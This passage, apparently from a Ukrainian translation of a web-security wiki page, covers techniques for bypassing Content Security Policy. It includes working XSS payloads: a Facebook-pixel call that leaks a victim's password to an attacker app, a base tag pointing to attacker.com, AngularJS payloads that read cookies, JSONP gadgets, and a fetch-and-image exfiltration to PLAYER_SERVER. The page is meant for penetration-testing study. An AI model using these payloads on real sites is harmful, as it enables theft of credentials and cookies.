5. –ü–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ "–ú–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—ñ–π" –≤–∞—à–æ–≥–æ –¥–æ–¥–∞—Ç–∫–∞ —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å —Å—Ç–≤–æ—Ä–µ–Ω–∏–π –≤–∞–º–∏ –¥–æ–¥–∞—Ç–æ–∫ (–∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–µ–Ω–µ–¥–∂–µ—Ä –ø–æ–¥—ñ–π –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ –∑–∞ URL, –ø–æ–¥—ñ–±–Ω–∏–º –¥–æ —Ü—å–æ–≥–æ: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events
6. –í–∏–±–µ—Ä—ñ—Ç—å –≤–∫–ª–∞–¥–∫—É "–¢–µ—Å—Ç–æ–≤—ñ –ø–æ–¥—ñ—ó", —â–æ–± –ø–æ–±–∞—á–∏—Ç–∏ –ø–æ–¥—ñ—ó, —è–∫—ñ –Ω–∞–¥—Å–∏–ª–∞—é—Ç—å—Å—è –≤–∞—à–∏–º –≤–µ–±-—Å–∞–π—Ç–æ–º.

–ü–æ—Ç—ñ–º, –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ –∂–µ—Ä—Ç–≤–∏, –≤–∏ –≤–∏–∫–æ–Ω—É—î—Ç–µ –Ω–∞—Å—Ç—É–ø–Ω–∏–π –∫–æ–¥ –¥–ª—è —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –ø—ñ–∫—Å–µ–ª—è –≤—ñ–¥—Å—Ç–µ–∂–µ–Ω–Ω—è Facebook, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏ –Ω–∞ –¥–æ–¥–∞—Ç–æ–∫ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Ä–æ–∑—Ä–æ–±–Ω–∏–∫–∞ Facebook –∞—Ç–∞–∫—É—é—á–æ–≥–æ —Ç–∞ –≤–∏–∫–æ–Ω–∞—Ç–∏ –≤–ª–∞—Å–Ω—É –ø–æ–¥—ñ—é, –ø–æ–¥—ñ–±–Ω—É –¥–æ —Ü—ñ—î—ó:

```JavaScript
fbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{‚Äã
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"‚Äã
});
```

–©–æ–¥–æ —ñ–Ω—à–∏—Ö —Å–µ–º–∏ —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –¥–æ–º–µ–Ω—ñ–≤, –≤–∫–∞–∑–∞–Ω–∏—Ö —É –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π —Ç–∞–±–ª–∏—Ü—ñ, —ñ—Å–Ω—É—î –±–∞–≥–∞—Ç–æ —ñ–Ω—à–∏—Ö —Å–ø–æ—Å–æ–±—ñ–≤ —ó—Ö –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è. –î–∏–≤—ñ—Ç—å—Å—è –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–π [–ø–æ—Å—Ç –±–ª–æ–≥—É](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) –¥–ª—è –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –ø–æ—è—Å–Ω–µ–Ω—å –ø—Ä–æ —ñ–Ω—à—ñ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Å—Ç–æ—Ä–æ–Ω–Ω—ñ–º–∏ –¥–æ–º–µ–Ω–∞–º–∏.

### –û–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

–ö—Ä—ñ–º –∑–∞–∑–Ω–∞—á–µ–Ω–æ–≥–æ –≤–∏—â–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –¥–ª—è –æ–±—Ö–æ–¥—É –æ–±–º–µ–∂–µ–Ω—å —à–ª—è—Ö—É, —ñ—Å–Ω—É—î —â–µ –æ–¥–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è Relative Path Overwrite (RPO) —ñ –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –Ω–∞ –¥–µ—è–∫–∏—Ö —Å–µ—Ä–≤–µ—Ä–∞—Ö.

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ CSP –¥–æ–∑–≤–æ–ª—è—î —à–ª—è—Ö `https://example.com/scripts/react/`, –π–æ–≥–æ –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

–ë—Ä–∞—É–∑–µ—Ä –≤ –∫—ñ–Ω—Ü–µ–≤–æ–º—É —Ä–∞—Ö—É–Ω–∫—É –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å `https://example.com/scripts/angular/angular.js`.

–¶–µ –ø—Ä–∞—Ü—é—î, –æ—Å–∫—ñ–ª—å–∫–∏ –¥–ª—è –±—Ä–∞—É–∑–µ—Ä–∞ –≤–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç–µ —Ñ–∞–π–ª –∑ –Ω–∞–∑–≤–æ—é `..%2fangular%2fangular.js`, —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–π –ø—ñ–¥ `https://example.com/scripts/react/`, —â–æ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î –ø–æ–ª—ñ—Ç–∏—Ü—ñ CSP.

–û—Ç–∂–µ, –≤–æ–Ω–∏ —Ä–æ–∑–∫–æ–¥—É—é—Ç—å —Ü–µ, –µ—Ñ–µ–∫—Ç–∏–≤–Ω–æ –∑–∞–ø–∏—Ç—É—é—á–∏ `https://example.com/scripts/react/../angular/angular.js`, —â–æ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç–Ω–æ `https://example.com/scripts/angular/angular.js`.

**–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ü—é –Ω–µ—É–∑–≥–æ–¥–∂–µ–Ω—ñ—Å—Ç—å —É —Ç–ª—É–º–∞—á–µ–Ω–Ω—ñ URL –º—ñ–∂ –±—Ä–∞—É–∑–µ—Ä–æ–º —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º, –º–æ–∂–Ω–∞ –æ–±—ñ–π—Ç–∏ –ø—Ä–∞–≤–∏–ª–∞ —à–ª—è—Ö—É**.

–†—ñ—à–µ–Ω–Ω—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ–± –Ω–µ —Ç—Ä–∞–∫—Ç—É–≤–∞—Ç–∏ `%2f` —è–∫ `/` –Ω–∞ —Å—Ç–æ—Ä–æ–Ω—ñ —Å–µ—Ä–≤–µ—Ä–∞, –∑–∞–±–µ–∑–ø–µ—á—É—é—á–∏ –ø–æ—Å–ª—ñ–¥–æ–≤–Ω–µ —Ç–ª—É–º–∞—á–µ–Ω–Ω—è –º—ñ–∂ –±—Ä–∞—É–∑–µ—Ä–æ–º —Ç–∞ —Å–µ—Ä–≤–µ—Ä–æ–º –¥–ª—è —É–Ω–∏–∫–Ω–µ–Ω–Ω—è —Ü—ñ—î—ó –ø—Ä–æ–±–ª–µ–º–∏.

–û–Ω–ª–∞–π–Ω-–ø—Ä–∏–∫–ª–∞–¥:[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### –í–∏–∫–æ–Ω–∞–Ω–Ω—è JS —É —Ñ—Ä–µ–π–º–∞—Ö

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### –≤—ñ–¥—Å—É—Ç–Ω—ñ—Å—Ç—å **base-uri**

–Ø–∫—â–æ –¥–∏—Ä–µ–∫—Ç–∏–≤–∞ **base-uri** –≤—ñ–¥—Å—É—Ç–Ω—è, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ó—ó –¥–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è [**–≤–∏—Å—è—á–æ–≥–æ –≤–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è —Ä–æ–∑–º—ñ—Ç–∫–∏**](../dangling-markup-html-scriptless-injection/).

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ **—Å—Ç–æ—Ä—ñ–Ω–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î —Å–∫—Ä–∏–ø—Ç, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `<script src="/js/app.js">`) –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **Nonce**, –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ **—Ç–µ–≥ base** –¥–ª—è —Ç–æ–≥–æ, —â–æ–± **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** —Å–∫—Ä–∏–ø—Ç –∑ **–≤–∞—à–æ–≥–æ –≤–ª–∞—Å–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞, –¥–æ—Å—è–≥–Ω—É–≤—à–∏ XSS.**\
–Ø–∫—â–æ —É—Ä–∞–∑–ª–∏–≤–∞ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞ –∑ **httpS**, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ URL-–∞–¥—Ä–µ—Å—É httpS —É –±–∞–∑—ñ.

```html
<base href="https://www.attacker.com/">
```

### –ü–æ–¥—ñ—ó AngularJS

–ö–æ–Ω–∫—Ä–µ—Ç–Ω–∞ –ø–æ–ª—ñ—Ç–∏–∫–∞, –≤—ñ–¥–æ–º–∞ —è–∫ –ø–æ–ª—ñ—Ç–∏–∫–∞ –±–µ–∑–ø–µ–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç—É (CSP), –º–æ–∂–µ –æ–±–º–µ–∂—É–≤–∞—Ç–∏ –ø–æ–¥—ñ—ó JavaScript. –¢–µ–º –Ω–µ –º–µ–Ω—à, AngularJS –≤–≤–æ–¥–∏—Ç—å –≤–ª–∞—Å–Ω—ñ –ø–æ–¥—ñ—ó —è–∫ –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤—É. –£ –º–µ–∂–∞—Ö –ø–æ–¥—ñ—ó AngularJS –Ω–∞–¥–∞—î —É–Ω—ñ–∫–∞–ª—å–Ω–∏–π –æ–±'—î–∫—Ç `$event`, —è–∫–∏–π –ø–æ—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ –æ–±'—î–∫—Ç –ø–æ–¥—ñ—ó –±—Ä–∞—É–∑–µ—Ä–∞. –¶–µ–π –æ–±'—î–∫—Ç `$event` –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –æ–±—Ö—ñ–¥—É CSP. –ó–æ–∫—Ä–µ–º–∞, –≤ Chrome –æ–±'—î–∫—Ç `$event/event` –º–∞—î –∞—Ç—Ä–∏–±—É—Ç `path`, —è–∫–∏–π –º—ñ—Å—Ç–∏—Ç—å –º–∞—Å–∏–≤ –æ–±'—î–∫—Ç—ñ–≤, —â–æ –≤—ñ–¥–æ–±—Ä–∞–∂–∞—é—Ç—å –ª–∞–Ω—Ü—é–≥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –ø–æ–¥—ñ—ó, –∑ –æ–±'—î–∫—Ç–æ–º `window` –∑–∞–≤–∂–¥–∏ —Ä–æ–∑—Ç–∞—à–æ–≤–∞–Ω–∏–º –≤ –∫—ñ–Ω—Ü—ñ. –¶—è —Å—Ç—Ä—É–∫—Ç—É—Ä–∞ —î –∫–ª—é—á–æ–≤–æ—é –¥–ª—è —Ç–∞–∫—Ç–∏–∫ –≤–∏—Ö–æ–¥—É –∑ –ø—ñ—Å–æ—á–Ω–∏—Ü—ñ.

–ù–∞–ø—Ä–∞–≤–ª—è—é—á–∏ —Ü–µ–π –º–∞—Å–∏–≤ –Ω–∞ —Ñ—ñ–ª—å—Ç—Ä `orderBy`, –º–æ–∂–Ω–∞ —ñ—Ç–µ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –∫—ñ–Ω—Ü–µ–≤–∏–π –µ–ª–µ–º–µ–Ω—Ç (–æ–±'—î–∫—Ç `window`), —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ –≥–ª–æ–±–∞–ª—å–Ω—É —Ñ—É–Ω–∫—Ü—ñ—é, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `alert()`. –ù–∞–≤–µ–¥–µ–Ω–∏–π –Ω–∏–∂—á–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥—É –¥–µ–º–æ–Ω—Å—Ç—Ä—É—î —Ü–µ–π –ø—Ä–æ—Ü–µ—Å:

```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

–¶–µ–π —É—Ä–∏–≤–æ–∫ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–∏—Ä–µ–∫—Ç–∏–≤–∏ `ng-focus` –¥–ª—è —Å–ø—Ä–∞—Ü—é–≤–∞–Ω–Ω—è –ø–æ–¥—ñ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `$event.path|orderBy` –¥–ª—è –º–∞–Ω—ñ–ø—É–ª—é–≤–∞–Ω–Ω—è –º–∞—Å–∏–≤–æ–º `path` —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –æ–±'—î–∫—Ç–∞ `window` –¥–ª—è –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ—ó `alert()`, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –≤–∏–∫—Ä–∏—Ç—Ç—è `document.cookie`.

**–ó–Ω–∞–π–¥—ñ—Ç—å —ñ–Ω—à—ñ –æ–±—Ö—ñ–¥–Ω—ñ —à–ª—è—Ö–∏ Angular –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS —Ç–∞ –¥–æ–º–µ–Ω –∑ –±—ñ–ª–∏–º —Å–ø–∏—Å–∫–æ–º

```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```

–ü–æ–ª—ñ—Ç–∏–∫–∞ CSP, —è–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –¥–æ–º–µ–Ω—ñ–≤ –¥–ª—è –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–∫—Ä–∏–ø—Ç—ñ–≤ —É –¥–æ–¥–∞—Ç–∫—É Angular JS, –º–æ–∂–µ –±—É—Ç–∏ –æ–±—ñ–π–¥–µ–Ω–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏–∫–ª–∏–∫—É —Ñ—É–Ω–∫—Ü—ñ–π –∑–≤–æ—Ä–æ—Ç–Ω—å–æ–≥–æ –≤–∏–∫–ª–∏–∫—É —Ç–∞ –ø–µ–≤–Ω–∏—Ö –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –∫–ª–∞—Å—ñ–≤. –î–æ–¥–∞—Ç–∫–æ–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ —Ü–µ–π –º–µ—Ç–æ–¥ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —É –¥–µ—Ç–∞–ª—å–Ω–æ–º—É –ø–æ—Å—ñ–±–Ω–∏–∫—É, –¥–æ—Å—Ç—É–ø–Ω–æ–º—É –Ω–∞ —Ü—å–æ–º—É [—Å—Ö–æ–≤–∏—â—ñ git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22).

–†–æ–±–æ—á—ñ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è:

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

–Ü–Ω—à—ñ JSONP —Ç–æ—á–∫–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ [**—Ç—É—Ç**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (–¥–µ—Ö—Ç–æ –∑ –Ω–∏—Ö –±—É–ª–∏ –≤–∏–¥–∞–ª–µ–Ω—ñ –∞–±–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω—ñ)

### –û–±—Ö—ñ–¥ —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è

–©–æ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è, –∫–æ–ª–∏ CSP –∑—ñ—Ç–∫–Ω—É—î—Ç—å—Å—è –∑ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ? –Ø–∫—â–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —ñ–Ω—à–æ–≥–æ –ø–æ—Ö–æ–¥–∂–µ–Ω–Ω—è, —è–∫–µ –Ω–µ –¥–æ–∑–≤–æ–ª–µ–Ω–æ, –≤–æ–Ω–æ –≤—Å–µ –æ–¥–Ω–æ –Ω–µ –≤–¥–∞—Å—Ç—å—Å—è.

–û–¥–Ω–∞–∫, –∑–≥—ñ–¥–Ω–æ –∑ –æ–ø–∏—Å–æ–º —É [CSP spec 4.2.2.3. Paths and Redirects](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), —è–∫—â–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —ñ–Ω—à–æ–≥–æ —à–ª—è—Ö—É, –≤–æ–Ω–æ –º–æ–∂–µ –æ–±—ñ–π—Ç–∏ –ø–æ—á–∞—Ç–∫–æ–≤—ñ –æ–±–º–µ–∂–µ–Ω–Ω—è.

–û—Å—å –ø—Ä–∏–∫–ª–∞–¥:

```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```

–Ø–∫—â–æ CSP –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ –Ω–∞ `https://www.google.com/a/b/c/d`, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—Ä–∞—Ö–æ–≤—É—î—Ç—å—Å—è —à–ª—è—Ö, –æ–±–∏–¥–≤–∞ —Å–∫—Ä–∏–ø—Ç–∏ `/test` —Ç–∞ `/a/test` –±—É–¥—É—Ç—å –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω—ñ CSP.

–û–¥–Ω–∞–∫ –∫—ñ–Ω—Ü–µ–≤–∏–π `http://localhost:5555/301` –±—É–¥–µ **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–π –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ –Ω–∞ `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. –û—Å–∫—ñ–ª—å–∫–∏ —Ü–µ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è, **—à–ª—è—Ö –Ω–µ –≤—Ä–∞—Ö–æ–≤—É—î—Ç—å—Å—è**, —ñ **—Å–∫—Ä–∏–ø—Ç –º–æ–∂–µ –±—É—Ç–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π**, –æ–±—Ö—ñ–¥ –æ–±–º–µ–∂–µ–Ω–Ω—è —à–ª—è—Ö—É.

–ó —Ü–∏–º –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è–º, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —à–ª—è—Ö –≤–∫–∞–∑–∞–Ω–∏–π –ø–æ–≤–Ω—ñ—Å—Ç—é, –≤—ñ–Ω –≤—Å–µ –æ–¥–Ω–æ –±—É–¥–µ –æ–±—Ö—ñ–¥.

–û—Ç–∂–µ, –Ω–∞–π–∫—Ä–∞—â–∏–º —Ä—ñ—à–µ–Ω–Ω—è–º —î –ø–µ—Ä–µ–∫–æ–Ω–∞—Ç–∏—Å—è, —â–æ –Ω–∞ –≤–µ–±-—Å–∞–π—Ç—ñ –≤—ñ–¥—Å—É—Ç–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤—ñ–¥–∫—Ä–∏—Ç–æ–≥–æ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è —Ç–∞ —â–æ –≤ –ø—Ä–∞–≤–∏–ª–∞—Ö CSP –Ω–µ–º–∞—î –¥–æ–º–µ–Ω—ñ–≤, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–ª—è –∞—Ç–∞–∫.

### –û–±—Ö—ñ–¥ CSP –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –≤–∏—Å—è—á–æ–≥–æ —Ä–æ–∑–º—ñ—Ç–∫–∏

–ü—Ä–æ—á–∏—Ç–∞–π—Ç–µ [—Ç—É—Ç](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; —á–µ—Ä–µ–∑ XSS

```
default-src 'self' 'unsafe-inline'; img-src *;
```

`'unsafe-inline'` –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Å–∫—Ä–∏–ø—Ç –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–¥—É (XSS –º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ –∫–æ–¥), –∞ `img-src *` –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω—Ü—ñ –±—É–¥—å-—è–∫–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ –±—É–¥—å-—è–∫–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É.

–í–∏ –º–æ–∂–µ—Ç–µ –æ–±—ñ–π—Ç–∏ —Ü–µ–π CSP, –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä—É—é—á–∏ –¥–∞–Ω—ñ —á–µ—Ä–µ–∑ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è (—É —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É XSS –∑–ª–æ–≤–∂–∏–≤–∞—î CSRF, –¥–µ —Å—Ç–æ—Ä—ñ–Ω–∫–∞, –¥–æ—Å—Ç—É–ø–Ω–∞ –±–æ—Ç—É, –º—ñ—Å—Ç–∏—Ç—å SQLi, —ñ –≤–∏—Ç—è–≥—É—î –ø—Ä–∞–ø–æ—Ä–µ—Ü—å —á–µ—Ä–µ–∑ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è):

```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```

–ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ü—ñ—î—ó –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏, —â–æ–± **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** –≤—Å—Ç–∞–≤–ª–µ–Ω–∏–π **–∫–æ–¥ JavaScript –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**. –ù–∞–ø—Ä–∏–∫–ª–∞–¥, —è–∫—â–æ —Å—Ç–æ—Ä—ñ–Ω–∫–∞ –¥–æ–∑–≤–æ–ª—è—î –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∑ Twitter. –í–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏** **—Å–ø–µ—Ü—ñ–∞–ª—å–Ω–µ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**, **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏** –π–æ–≥–æ –Ω–∞ Twitter —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ "**unsafe-inline**" –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è** –∫–æ–¥—É JS (—è–∫ –∑–≤–∏—á–∞–π–Ω–∏–π XSS), —è–∫–∏–π **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç—å** **–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è**, **–≤–∏—Ç—è–≥–Ω–µ** –∑ –Ω—å–æ–≥–æ **JS** —ñ **–≤–∏–∫–æ–Ω–∞—î** **–π–æ–≥–æ**: [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### –ó–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–ª—É–∂–±–æ–≤–∏—Ö —Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤

–§—É–Ω–∫—Ü—ñ—è **`importScripts`** —Å–ª—É–∂–±–æ–≤–∏—Ö —Ä–æ–±—ñ—Ç–Ω–∏–∫—ñ–≤ –Ω–µ –æ–±–º–µ–∂—É—î—Ç—å—Å—è CSP:

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### –í–ø—Ä–æ–≤–∞–¥–∂–µ–Ω–Ω—è –ø–æ–ª—ñ—Ç–∏–∫–∏

**–î–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—è:** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

